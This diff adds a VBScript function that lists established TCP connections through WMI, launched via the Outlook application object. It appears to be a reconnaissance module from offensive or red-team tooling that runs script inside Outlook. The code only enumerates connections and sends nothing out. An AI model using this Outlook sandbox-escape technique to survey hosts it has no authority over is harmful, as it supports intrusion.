@@ -1,0 +1,15 @@
+function netstat()
+    on error resume next
+	Set objLocator = window.external.OutlookApplication.CreateObject("WbemScripting.SWbemLocator")
+    Set objWMIService = objLocator.ConnectServer(".", "root\StandardCimv2")
+    
+    Set colNetstat = objWMIService.ExecQuery("SELECT LocalAddress, RemoteAddress, RemotePort FROM MSFT_NetTCPConnection WHERE State = 5 AND RemoteAddress <> '127.0.0.1' AND RemoteAddress <> '::1' AND RemotePort < 49152")
+    
+    If colNetstat.Count = 0 Then
+        netstat = "No active TCP connections found."
+    Else
+        For Each conn In colNetstat
+            netstat = netstat & "Local: " & conn.LocalAddress & " | Remote: " & conn.RemoteAddress & ":" & conn.RemotePort & vbCrLf
+        Next
+    End If
+end function
